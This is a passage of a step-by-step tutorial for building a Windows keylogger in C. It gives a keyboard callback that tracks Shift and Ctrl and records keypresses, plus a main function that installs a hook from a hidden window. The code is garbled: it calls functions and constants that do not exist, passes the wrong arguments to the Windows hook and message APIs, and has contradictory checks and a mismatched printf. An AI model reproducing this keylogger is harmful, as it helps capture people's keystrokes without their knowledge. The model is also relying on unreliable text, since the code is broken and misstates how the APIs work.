```

### Step 2: Define the Callback Function
Define a function to handle keyboard events:
```c
void CALLBACK KeyLoggerCallback(int nCode, WPARAM wParam, LPARAM lParam);
```

### Step 3: Implement the Callback Function
Inside the callback, handle the key events:
```c
void CALLBACK KeyLoggerCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    static int shift = 0;
    static int ctrl = 0;

    if (nCode == HC_ACTION && wParam == KEYDOWN) {
        // Check if it's a keyboard key
        if (wParam == VK_KEYSTATESHEET) {
            // Handle extended key states
        }

        // Check if the key is a modifier
        if (wParam == VK_SHIFT) {
            if (wParam == 0) {
                shift = 0;
            } else {
                shift = 1;
            }
        } else if (wParam == VK_CONTROL) {
            if (wParam == 0) {
                ctrl = 0;
            } else {
                ctrl = 1;
            }
        }

        // Record the key press
        char key = GetKeyName(wParam);
        // Append key and modifiers to a log file
        printf("%s %d %d\n", key, (shift != 0) ? "Shift" : "", (ctrl != 0) ? "Ctrl" : "");
    } else if (nCode == HC_ACTION && wParam == KEYUP) {
        // Handle key releases
        if (wParam == VK_SHIFT) {
            shift = 0;
        } else if (wParam == VK_CONTROL) {
            ctrl = 0;
        }
    }
}
```

### Step 4: Set Up the Keyboard Hook
Use `SetWindowsHook` to install the hook:
```c
int main() {
    HWND hwnd = CreateWindowEx(0, "KeyLogger", 0, 0, 0, 0, 0, WS_HIDEWINDOW, 0, 0, 0, 0);
    HHOOK hHook = SetWindowsHook(hwnd, WH_KEYBOARD);

    if (hHook == NULL) {
        printf("Failed to install keyboard hook.\n");
        return 1;
    }

    // Start the loop to process events
    MSG msg = {0};
    while (GetMessage(hwnd, &msg) > 0) {
        if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
            if (msg.hwnd == hwnd) {
                // Call the callback function
                CallNextHook(hHook, &msg);
            }
        }
    }

    // Uninstall the hook
    UninstallWindowHook(hHook);
    return 0;
}
```

